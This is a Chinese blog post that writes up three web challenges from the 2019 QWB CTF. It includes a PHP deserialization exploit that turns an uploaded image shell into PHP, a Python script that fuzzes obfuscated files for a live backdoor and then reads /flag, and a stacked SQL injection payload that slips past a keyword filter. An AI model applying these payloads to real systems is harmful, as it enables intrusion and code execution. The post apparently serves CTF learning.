<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title>qwbctf2019 · null</title><meta name="description" content="强网杯webupload0x01 信息搜集
网站功能：注册和登录，尝试注册一个账号，会出现一个上传页面，尝试上传
想到上传漏洞，疯狂fuzz，但是没卵用，于是老老实实上传了一个图片


这个页面似乎没有什么特别之处，当出现未存在页面会跳转回index.php/home.html，这个时候普通扫描器存"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/"></a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"><li><a href="https://twitter.com/www.baidu.com"><i class="fa fa-twitter"></i></a></li><li><a href="http://weibo.com/www.baidu.com"><i class="fa fa-weibo"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>qwbctf2019</a></h3></div><div class="post-content"><h1 id="强网杯"><a href="#强网杯" class="headerlink" title="强网杯"></a>强网杯</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><h4 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h4><ul>
<li>网站功能：注册和登录，尝试注册一个账号，会出现一个上传页面，尝试上传</li>
<li>想到上传漏洞，疯狂fuzz，但是没卵用，于是老老实实上传了一个图片</li>
</ul>
<p><img src="https://i.loli.net/2019/06/02/5cf3ef419d83569270.png" alt=""></p>
<p>这个页面似乎没有什么特别之处，当出现未存在页面会跳转回<code>index.php/home.html</code>，这个时候普通扫描器存在弊端那就是他根据状态码来判断页面存在与否，所以我们可以利用<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> ，于是找到了一个<code>www.tar.gz</code>，那就是源码泄露了</p>
<p>另一方面，观察cookie，似乎是base64，将其解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:5:&#123;s:2:&quot;ID&quot;;i:4;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:5:&quot;email&quot;;s:7:&quot;a@a.com&quot;;s:8:&quot;password&quot;;s:32:&quot;0cc175b9c0f1b6a831c399e269772661&quot;;s:3:&quot;img&quot;;s:79:&quot;../upload/8af43a2068b1f60b959c6b26a1b566d0/f47454d1d3644127f42070181a8b9afc.png&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>熟悉的味道–<strong>反序列化</strong>，尝试直接利用，错了，于是审计代码</p>
<ul>
<li>定位到<code>/web/controller/</code>,有四个页面：<code>index</code>、<code>login</code>、<code>register</code>、<code>profile</code></li>
<li><code>index.php</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function login_check()&#123;//登录检查</span><br><span class="line">    $profile=cookie(&apos;user&apos;);</span><br><span class="line">    if(!empty($profile))&#123;</span><br><span class="line">        $this-&gt;profile=unserialize(base64_decode($profile));//反序列化，漏洞点</span><br><span class="line">        $this-&gt;profile_db=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&apos;ID&apos;]))-&gt;find();</span><br><span class="line">        if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>真正的重点：<code>profile.php</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line"></span><br><span class="line">use think\Controller;</span><br><span class="line"></span><br><span class="line">class Profile extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $filename_tmp;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $upload_menu;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $img;</span><br><span class="line">    public $except;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checker=new Index();</span><br><span class="line">        $this-&gt;upload_menu=md5($_SERVER[&apos;REMOTE_ADDR&apos;]);//目录创建方式</span><br><span class="line">        @chdir(&quot;../public/upload&quot;);</span><br><span class="line">        if(!is_dir($this-&gt;upload_menu))&#123;//判断是否已经存在</span><br><span class="line">            @mkdir($this-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir($this-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function upload_img()&#123;//跳转</span><br><span class="line">        if($this-&gt;checker)&#123;</span><br><span class="line">            if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=&quot;http://&quot;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;SCRIPT_NAME&apos;].&quot;/index&quot;;</span><br><span class="line">                $this-&gt;redirect($curr_url,302);</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_FILES))&#123;//创建file，利用md5加密，添加.png后缀</span><br><span class="line">            $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;;</span><br><span class="line">            $this-&gt;ext_check();//png检查</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;ext) &#123;</span><br><span class="line">            if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy($this-&gt;filename_tmp, $this-&gt;filename);//复制</span><br><span class="line">                @unlink($this-&gt;filename_tmp);//删除源文件</span><br><span class="line">                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">                $this-&gt;update_img();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&apos;Forbidden type!&apos;, url(&apos;../index&apos;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&apos;Unknow file type!&apos;, url(&apos;../index&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function update_img()&#123;//检查用户</span><br><span class="line">        $user_info=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&apos;ID&apos;])-&gt;find();</span><br><span class="line">        if(empty($user_info[&apos;img&apos;]) &amp;&amp; $this-&gt;img)&#123;</span><br><span class="line">            if(db(&apos;user&apos;)-&gt;where(&apos;ID&apos;,$user_info[&apos;ID&apos;])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update())&#123;</span><br><span class="line">                $this-&gt;update_cookie();</span><br><span class="line">                $this-&gt;success(&apos;Upload img successful!&apos;, url(&apos;../home&apos;));</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&apos;Upload file failed!&apos;, url(&apos;../index&apos;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function update_cookie()&#123;</span><br><span class="line">        $this-&gt;checker-&gt;profile[&apos;img&apos;]=$this-&gt;img;</span><br><span class="line">        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function ext_check()&#123;</span><br><span class="line">        $ext_arr=explode(&quot;.&quot;,$this-&gt;filename);</span><br><span class="line">        $this-&gt;ext=end($ext_arr);</span><br><span class="line">        if($this-&gt;ext==&quot;png&quot;)&#123;//判断文件是否为png文件</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>前导知识，php魔术方法，重载：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP所提供的重载（overloading）是指动态地创建类属性和方法。我们是通过魔术方法（magic methods）来实现的。</span><br><span class="line"></span><br><span class="line">当调用当前环境下未定义或不可见的类属性或方法时，重载方法会被调用。本节后面将使用不可访问属性（inaccessible properties）和不可访问方法（inaccessible methods）来称呼这些未定义或不可见的类属性或方法。</span><br><span class="line"></span><br><span class="line">所有的重载方法都必须被声明为 public</span><br></pre></td></tr></table></figure>
<ul>
<li><code>__get</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取不可访问属性的值时，__get() 会被调用。</span><br></pre></td></tr></table></figure>
<ul>
<li><code>__call</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在对象中调用一个不可访问方法时，__call() 会被调用。</span><br></pre></td></tr></table></figure>
<ul>
<li>关键利用点</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;ext) &#123;</span><br><span class="line">            if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy($this-&gt;filename_tmp, $this-&gt;filename);//复制</span><br><span class="line">                @unlink($this-&gt;filename_tmp);//删除源文件</span><br><span class="line">                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">                $this-&gt;update_img();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&apos;Forbidden type!&apos;, url(&apos;../index&apos;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&apos;Unknow file type!&apos;, url(&apos;../index&apos;));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>上传一个shell，伪装为png，然后再重命名为php文件，那么就可以读取文件<br>我们可以直接通过<code>_GET</code>请求绕过如下判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_FILES))&#123;</span><br><span class="line">    $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">    $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;;</span><br><span class="line">    $this-&gt;ext_check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们的目的是要触发<code>uploa_image</code>方法，于是我们在<code>register.php</code>中看到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function __construct()</span><br><span class="line">   &#123;</span><br><span class="line">       $this-&gt;checker=new Index();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   public function __destruct()</span><br><span class="line">   &#123;</span><br><span class="line">       if(!$this-&gt;registed)&#123;</span><br><span class="line">           $this-&gt;checker-&gt;index();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p><strong>其 $this-&gt;registed、$this-&gt;checker 在反序列化时也是可控的。如果我们将 $this-&gt;checker 赋值为 Register 类，而 Register 类没有 index 方法，所以调用的时候就会触发 __call 方法，这样就形成了一条完整的攻击链</strong></p>
<p>就有了如下exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line">use think\Controller;</span><br><span class="line"></span><br><span class="line">class Register</span><br><span class="line">&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $registed = false;</span><br><span class="line">    public function __construct($checker)&#123;</span><br><span class="line">        $this-&gt;checker = $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Profile</span><br><span class="line">&#123;   # 先上传一个图片马shell.png，保存路径为/upload/md5($_SERVER[&apos;REMOTE_ADDR&apos;])/md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;</span><br><span class="line">    public $filename_tmp = &apos;./upload/af536bff8dbcf3875d093da49ba4e4ca/434a1f0621da555e5703d2bac3e4f357.png&apos;;</span><br><span class="line">    public $filename = &apos;./upload/af536bff8dbcf3875d093da49ba4e4ca/ct1.php&apos;;</span><br><span class="line">    public $ext = true;</span><br><span class="line">    public $except = array(&apos;index&apos; =&gt; &apos;upload_img&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$register = new Register(new Profile());</span><br><span class="line">echo urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注：shell由蚁剑生成，一句话不好连接</p>
</blockquote>
<h3 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h3><p><img src="https://www.zhaoj.in/wp-content/uploads/2019/05/1558835272fd70292e56dc92e7b063263780c6de81-1024x211.png" alt=""></p>
<p>下载源码，发现全是混淆过的：<br><img src="https://skysec.top/images/2019-05-25-15-35-59.png" alt=""></p>
<p><img src="https://skysec.top/images/706CA7490B0918EB26FE6AD941437F24.jpg" alt=""></p>
<p>既然为shell，我们尝试寻找<code>GET、post、assert、system</code>等可利用点，尝试<code>fuzz</code>的方法，将其中的参数复制为<code>echo &quot;fuck&quot;</code>，若成功则很可能为shell，利用多线程，提高效率：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import os,re</span><br><span class="line">import requests</span><br><span class="line">from multiprocessing import Pool</span><br><span class="line"></span><br><span class="line">filenames = os.listdir(&apos;C:\\MySoftwares\\php_develop\\WWW\\src&apos;)</span><br><span class="line">pattern = re.compile(r&quot;\$_[GEPOST]&#123;3,4&#125;\[.*\]&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read_file(file):</span><br><span class="line">    for name in filenames:</span><br><span class="line">        print(name)</span><br><span class="line">        with open(&apos;C:\\MySoftwares\\php_develop\\WWW\\src\\&apos;+name,&apos;r&apos;) as f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        result = list(set(pattern.findall(data)))</span><br><span class="line"></span><br><span class="line">        for ret in result:</span><br><span class="line">            try:</span><br><span class="line">                command = &apos;echo &quot;fuck&quot;&apos;</span><br><span class="line">                flag = &apos;fuck&apos;</span><br><span class="line">                # command = &apos;phpinfo();&apos;</span><br><span class="line">                # flag = &apos;phpinfo&apos;</span><br><span class="line">                if &apos;GET&apos; in ret:</span><br><span class="line">                    passwd = re.findall(r&quot;&apos;(.*)&apos;&quot;,ret)[0]</span><br><span class="line">                    r = requests.get(url=&apos;http://web15.buuoj.cn/&apos; + name + &apos;?&apos; + passwd + &apos;=&apos;+ command)</span><br><span class="line">                    if flag in r.text:</span><br><span class="line">                        print(&apos;backdoor file is: &apos; + name)</span><br><span class="line">                        print(&apos;GET:  &apos; + passwd)</span><br><span class="line">                # elif &apos;POST&apos; in ret:</span><br><span class="line">                #     passwd = re.findall(r&quot;&apos;(.*)&apos;&quot;,ret)[0]</span><br><span class="line">                #     r = requests.post(url=&apos;http://127.0.0.1:8888/&apos; + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                #     if flag in r.text:</span><br><span class="line">                #         print(&apos;backdoor file is: &apos; + name)</span><br><span class="line">                #         print(&apos;POST:  &apos; + passwd)</span><br><span class="line">            except : pass</span><br><span class="line"></span><br><span class="line">def main(): </span><br><span class="line">    pool = Pool(processes=15)</span><br><span class="line">    for i in range(0,len(filenames),int(len(filenames)/15)):</span><br><span class="line">        pool.apply_async(read_file,(i+int(len(filenames)/15),))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>跑了n年，最终找到了shell：<br><img src="https://i.loli.net/2019/06/06/5cf87c3996a8f98210.png" alt=""></p>
<p>然后在根目录找到flag，直接<code>cat /flag</code></p>
<h3 id="babywebbb"><a href="#babywebbb" class="headerlink" title="babywebbb"></a>babywebbb</h3><p>参考<a href="https://skysec.top/2019/05/25/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFonline-Web-Writeup/#babywebbb" target="_blank" rel="noopener">飘零师傅的</a></p>
<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>注意到<code>/?inject=1</code>，get方式传值</p>
<p>尝试<code>1&#39;</code>，报错</p>
<blockquote>
<p>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’1’’’ at line 1</p>
</blockquote>
<p>大致猜测到闭合方式，尝试闭合<code>?inject=1&quot;%23</code>，返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>尝试<code>union select</code>返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure></p>
<p>尝试<code>?inject=1%27||1%23</code>列出了所有内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以多语句查询<code>inject=0%27;show%20tables;%23</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以利用mysql预编译（prepare），prepare语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MySQL prepare语法： </span><br><span class="line">PREPARE statement_name FROM preparable_SQL_statement; /*定义*/ </span><br><span class="line">EXECUTE statement_name [USING @var_name...]; /*执行预处理语句*/</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE statement_name /*删除定义*/ ;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>PREPARE语句用于预备一个语句，并指定名称statement_name，以后引用该语句。语句名称对大小写不敏感。preparable_SQL_statement可以是一个文字字符串，也可以是一个包含了语句文本的用户变量。该文本必须表现为一个单一的SQL语句，而不是多个语句。在这语句里，‘?’字符可以被用于标识参数，当执行时，以指示数据值绑定到查询后。‘?’字符不应加引号，即使你想要把它们与字符串值结合在一起。参数标记只能用于数据值应该出现的地方，而不是SQL关键字，标识符，等等。<br>如果预语句已经存在，则在新的预语句被定义前，它会被隐含地删掉。</p>
</blockquote>
<p>构造如下语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(&apos;sel&apos;,&apos;ect * from `1919810931114514`&apos;);</span><br><span class="line">prepare presql from @sql;</span><br><span class="line">execute presql;</span><br><span class="line">deallocate prepare presql;</span><br></pre></td></tr></table></figure></p>
<p>提示：</p>
<blockquote>
<p>strstr($inject, “set”) &amp;&amp; strstr($inject, “prepare”)</p>
</blockquote>
<p>strstr — 查找字符串的首次出现，区分大小写，所以改为大写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1%27;SET%20@sql=concat(%27sel%27,%27ect%20*%20from%20`1919810931114514`%27);%20PREPARE%20presql%20from%20@sql;%20execute%20presql;%20deallocate%20PREPARE%20presql;</span><br></pre></td></tr></table></figure>
<p>reference:<br><a href="https://skysec.top/2019/05/25/2019-强网杯online-Web-Writeup/" target="_blank" rel="noopener">https://skysec.top/2019/05/25/2019-强网杯online-Web-Writeup/</a><br><a href="https://xz.aliyun.com/t/5282" target="_blank" rel="noopener">https://xz.aliyun.com/t/5282</a></p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-06-06</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ctf/" title="ctf">ctf </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function 